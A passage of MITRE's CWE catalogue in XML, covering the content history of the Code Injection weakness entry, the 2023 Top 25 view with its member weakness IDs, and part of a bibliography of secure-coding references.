            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
            <Reference External_Reference_ID="REF-1372"/>
            <Reference External_Reference_ID="REF-1373" Section="ast.literal_eval(node_or_string)"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Research_Gaps, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
				  <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
				  <Contribution_Date>2023-06-29</Contribution_Date>
				  <Contribution_Version>4.12</Contribution_Version>
				  <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
				  <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
				</Contribution>
            <Previous_Entry_Name Date="2009-01-12">Code Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Control Generation of Code (aka 'Code Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Failure to Control Generation of Code ('Code Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
   </Weaknesses>
   <Views>
      <View ID="1425" Name="Weaknesses in the 2023 CWE Top 25 Most Dangerous Software Weaknesses" Type="Graph" Status="Draft">
            <Objective>CWE entries in this view are listed in the 2023 CWE Top 25 Most Dangerous Software Weaknesses.</Objective>
            <Audience>
                <Stakeholder>
                    <Type>Software Developers</Type>
                    <Description>By following the CWE Top 25, developers are able to significantly reduce the number of weaknesses that occur in their software.</Description>
                </Stakeholder>
                <Stakeholder>
               <Type>Product Customers</Type>
                    <Description>Customers can use the weaknesses in this view in order to formulate independent evidence of a claim by a product vendor to have eliminated / mitigated the most dangerous weaknesses.</Description>
                </Stakeholder>
                <Stakeholder>
                    <Type>Educators</Type>
                    <Description>Educators can use this view to focus curriculum and teachings on the most dangerous weaknesses.</Description>
                </Stakeholder>
            </Audience>
            <Members>
			  <Has_Member CWE_ID="787" View_ID="1425"/>
			  <Has_Member CWE_ID="79" View_ID="1425"/>
			  <Has_Member CWE_ID="89" View_ID="1425"/>
			  <Has_Member CWE_ID="416" View_ID="1425"/>
			  <Has_Member CWE_ID="78" View_ID="1425"/>
			  <Has_Member CWE_ID="20" View_ID="1425"/>
			  <Has_Member CWE_ID="125" View_ID="1425"/>
			  <Has_Member CWE_ID="22" View_ID="1425"/>
			  <Has_Member CWE_ID="352" View_ID="1425"/>
			  <Has_Member CWE_ID="434" View_ID="1425"/>
			  <Has_Member CWE_ID="862" View_ID="1425"/>
			  <Has_Member CWE_ID="476" View_ID="1425"/>
			  <Has_Member CWE_ID="287" View_ID="1425"/>
			  <Has_Member CWE_ID="190" View_ID="1425"/>
			  <Has_Member CWE_ID="502" View_ID="1425"/>
			  <Has_Member CWE_ID="77" View_ID="1425"/>
			  <Has_Member CWE_ID="119" View_ID="1425"/>
			  <Has_Member CWE_ID="798" View_ID="1425"/>
			  <Has_Member CWE_ID="918" View_ID="1425"/>
			  <Has_Member CWE_ID="306" View_ID="1425"/>
			  <Has_Member CWE_ID="362" View_ID="1425"/>
			  <Has_Member CWE_ID="269" View_ID="1425"/>
			  <Has_Member CWE_ID="94" View_ID="1425"/>
			  <Has_Member CWE_ID="863" View_ID="1425"/>
			  <Has_Member CWE_ID="276" View_ID="1425"/>
            </Members>
            <References>
                <Reference External_Reference_ID="REF-1344"/>
            </References>
         <Mapping_Notes>
            <Usage>Prohibited</Usage>
            <Rationale>This entry is a View. Views are not weaknesses and therefore inappropriate to describe the root causes of vulnerabilities.</Rationale>
            <Comments>Use this View or other Views to search and navigate for the appropriate weakness.</Comments>
            <Reasons>
               <Reason Type="View"/>
            </Reasons>
         </Mapping_Notes>
            <Content_History>
                <Submission>
                    <Submission_Name>CWE Content Team</Submission_Name>
                    <Submission_Organization>MITRE</Submission_Organization>
                    <Submission_Date>2023-06-26</Submission_Date>
                    <Submission_Version>4.12</Submission_Version>
                    <Submission_ReleaseDate>2023-06-29</Submission_ReleaseDate>
                </Submission>
            </Content_History>
        </View>
   </Views>
   <External_References>
      <External_Reference Reference_ID="REF-6">
			<Author>Katrina Tsipenyuk</Author>
			<Author>Brian Chess</Author>
			<Author>Gary McGraw</Author>
			<Title>Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors</Title>
			<Publication>NIST Workshop on Software Security Assurance Tools Techniques and Metrics</Publication>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<Publisher>NIST</Publisher>
			<URL>https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-7">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Title>Writing Secure Code</Title>
			<Edition>2nd Edition</Edition>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>Microsoft Press</Publisher>
			<URL>https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-18">
			<Author>Secure Software, Inc.</Author>
			<Title>The CLASP Application Security Process</Title>
			<Publication_Year>2005</Publication_Year>
			<URL>https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-44">
			<Author>Michael Howard</Author>
			<Author>David LeBlanc</Author>
			<Author>John Viega</Author>
			<Title>24 Deadly Sins of Software Security</Title>
			<Publication>McGraw-Hill</Publication>
			<Publication_Year>2010</Publication_Year>
		</External_Reference>
      <External_Reference Reference_ID="REF-45">
			<Author>OWASP</Author>
			<Title>OWASP Enterprise Security API (ESAPI) Project</Title>
			<URL>http://www.owasp.org/index.php/ESAPI</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-48">
			<Author>Jeremiah Grossman</Author>
			<Title>Input validation or output filtering, which is better?</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<URL>https://blog.jeremiahgrossman.com/2007/01/input-validation-or-output-filtering.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-56">
			<Author>Microsoft</Author>
			<Title>Using the Strsafe.h Functions</Title>
			<URL>https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-57">
			<Author>Matt Messier</Author>
			<Author>John Viega</Author>
			<Title>Safe C String Library v1.0.3</Title>
			<URL>http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-58">
			<Author>Michael Howard</Author>
			<Title>Address Space Layout Randomization in Windows Vista</Title>
			<URL>https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-59">
			<Author>Arjan van de Ven</Author>
			<Title>Limiting buffer overflows with ExecShield</Title>
			<URL>https://archive.is/saAFo</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-60">
			<Title>PaX</Title>
			<URL>https://en.wikipedia.org/wiki/Executable_space_protection#PaX</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-61">
			<Author>Microsoft</Author>
			<Title>Understanding DEP as a mitigation technology part 1</Title>
			<URL>https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-62">
			<Author>Mark Dowd</Author>
			<Author>John McDonald</Author>
			<Author>Justin Schuh</Author>
			<Title>The Art of Software Security Assessment</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2006</Publication_Year>
			<Publisher>Addison Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-64">
			<Author>Grant Murphy</Author>
			<Title>Position Independent Executables (PIE)</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<Publisher>Red Hat</Publisher>
			<URL>https://www.redhat.com/en/blog/position-independent-executables-pie</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-76">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Least Privilege</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-90">
			<Title>Buffer UNDERFLOWS: What do you know about it?</Title>
			<Publication>Vuln-Dev Mailing List</Publication>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>https://seclists.org/vuln-dev/2004/Jan/22</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-106">
			<Author>David LeBlanc</Author>
			<Author>Niels Dekker</Author>
			<Title>SafeInt</Title>
			<URL>http://safeint.codeplex.com/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-140">
			<Author>Greg Hoglund</Author>
			<Author>Gary McGraw</Author>
			<Title>Exploiting Software: How to Break Code</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<Publisher>Addison-Wesley</Publisher>
			<URL>https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-145">
			<Author>Yves Younan</Author>
			<Title>An overview of common programming security vulnerabilities and possible solutions</Title>
			<Publication>Student thesis section 5.4.3</Publication>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<URL>http://fort-knox.org/thesis.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-146">
			<Author>blexim</Author>
			<Title>Basic Integer Overflows</Title>
			<Publication>Phrack - Issue 60, Chapter 10</Publication>
			<URL>http://www.phrack.org/issues.html?issue=60&amp;id=10#article</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-150">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 17 - Integer Overflow Or Wraparound</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/18/top-25-series-rank-17-integer-overflow-or-wraparound</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-166">
			<Author>Jim Manico</Author>
			<Title>Input Validation with ESAPI - Very Important</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://manicode.blogspot.com/2008/08/input-validation-with-esapi.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-168">
			<Author>Joel Scambray</Author>
			<Author>Mike Shema</Author>
			<Author>Caleb Sima</Author>
			<Title>Hacking Exposed Web Applications, Second Edition</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>McGraw-Hill</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-170">
			<Author>Kevin Beaver</Author>
			<Title>The importance of input validation</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-172">
			<Author>Chris Wysopal</Author>
			<Title>Mobile App Top 10 List</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://www.veracode.com/blog/2010/12/mobile-app-top-10-list</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-185">
			<Author>OWASP</Author>
			<Title>Testing for Path Traversal (OWASP-AZ-001)</Title>
			<URL>http://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-186">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 7 - Path Traversal</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-7-path-traversal/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-229">
			<Author>NIST</Author>
			<Title>Role Based Access Control and Role Based Security</Title>
			<URL>https://csrc.nist.gov/projects/role-based-access-control</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-231">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-5-improper-access-control-authorization/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-233">
			<Author>Rahul Bhattacharjee</Author>
			<Title>Authentication using JAAS</Title>
			<URL>https://javaranch.com/journal/2008/04/authentication-using-JAAS.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-236">
			<Author>Kim Zetter</Author>
			<Title>Weak Password Brings 'Happiness' to Twitter Hacker</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>https://www.wired.com/2009/01/professed-twitt/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-237">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Broken Authentication and Session Management</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A7</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-238">
			<Author>OWASP</Author>
			<Title>Guide to Authentication</Title>
			<URL>http://www.owasp.org/index.php/Guide_to_Authentication</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-239">
			<Author>Microsoft</Author>
			<Title>Authentication</Title>
			<URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-257">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 19 - Missing Authentication for Critical Function</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-19-missing-authentication-for-critical-function/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-329">
			<Author>Peter W</Author>
			<Title>Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)</Title>
			<Publication>Bugtraq</Publication>
			<URL>http://marc.info/?l=bugtraq&amp;m=99263135911884&amp;w=2</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-330">
			<Author>OWASP</Author>
			<Title>Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-331">
			<Author>Edward W. Felten</Author>
			<Author>William Zeller</Author>
			<Title>Cross-Site Request Forgeries: Exploitation and Prevention</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<URL>https://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-332">
			<Author>Robert Auger</Author>
			<Title>CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ</Title>
			<URL>https://www.cgisecurity.com/csrf-faq.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-333">
			<Title>Cross-site request forgery</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>https://en.wikipedia.org/wiki/Cross-site_request_forgery</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-334">
			<Author>Jason Lam</Author>
			<Title>Top 25 Series - Rank 4 - Cross Site Request Forgery</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-335">
			<Author>Jeff Atwood</Author>
			<Title>Preventing CSRF and XSRF Attacks</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://blog.codinghorror.com/preventing-csrf-and-xsrf-attacks/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-349">
			<Author>Andrei Alexandrescu</Author>
			<Title>volatile - Multithreaded Programmer's Best Friend</Title>
			<Publication>Dr. Dobb's</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>https://drdobbs.com/cpp/volatile-the-multithreaded-programmers-b/184403766</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-350">
			<Author>Steven Devijver</Author>
			<Title>Thread-safe webapps using Spring</Title>
			<URL>https://web.archive.org/web/20170609174845/http://www.javalobby.org/articles/thread-safe/index.jsp</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-351">
			<Author>David Wheeler</Author>
			<Title>Prevent race conditions</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<URL>https://www.ida.liu.se/~TDDC90/literature/papers/SP-race-conditions.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-352">
			<Author>Matt Bishop</Author>
			<Title>Race Conditions, Files, and Security Flaws; or the Tortoise and the Hare Redux</Title>
			<Publication_Year>1995</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>https://seclab.cs.ucdavis.edu/projects/vulnerabilities/scriv/ucd-ecs-95-08.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-353">
			<Author>David Wheeler</Author>
			<Title>Secure Programming for Linux and Unix HOWTO</Title>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-354">
			<Author>Blake Watts</Author>
			<Title>Discovering and Exploiting Named Pipe Security Flaws for Fun and Profit</Title>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<URL>https://www.blakewatts.com/blog/discovering-and-exploiting-named-pipe-security-flaws-for-fun-and-profit</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-355">
			<Author>Roberto Paleari</Author>
			<Author>Davide Marrone</Author>
			<Author>Danilo Bruschi</Author>
			<Author>Mattia Monga</Author>
			<Title>On Race Vulnerabilities in Web Applications</Title>
			<URL>http://security.dico.unimi.it/~roberto/pubs/dimva08-web.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-356">
			<Title>Avoiding Race Conditions and Insecure File Operations</Title>
			<Publication>Apple Developer Connection</Publication>
			<URL>https://web.archive.org/web/20081010155022/http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-357">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 25 - Race Conditions</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
